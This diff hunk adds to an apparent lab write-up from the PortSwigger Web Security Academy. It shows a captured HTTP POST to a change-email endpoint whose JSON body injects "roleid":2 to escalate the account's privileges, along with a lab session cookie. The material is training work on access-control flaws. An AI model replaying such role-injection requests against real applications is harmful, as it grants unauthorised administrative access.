@@ -131,7 +131,24 @@ If the target user is an application administrator, then the attacker will gain 
  Send the email submission request to Burp Repeater, add "roleid":2 into the JSON in the request body, and resend it. 
  Observe that the response shows your roleid has changed to 2.
 
+     POST /my-account/change-email HTTP/1.1
+Host: 0af600bd034d16ccc01622bd007500ff.web-security-academy.net
+Cookie: session=BtwJhdFHvFMf80vO1cbyBAFzL6fR2Ybb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 37
+Origin: https://0af600bd034d16ccc01622bd007500ff.web-security-academy.net
+Referer: https://0af600bd034d16ccc01622bd007500ff.web-security-academy.net/my-account?id=wiener
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: close
 
+{"email":"asif@khan.com","roleid":2}
 
 
 
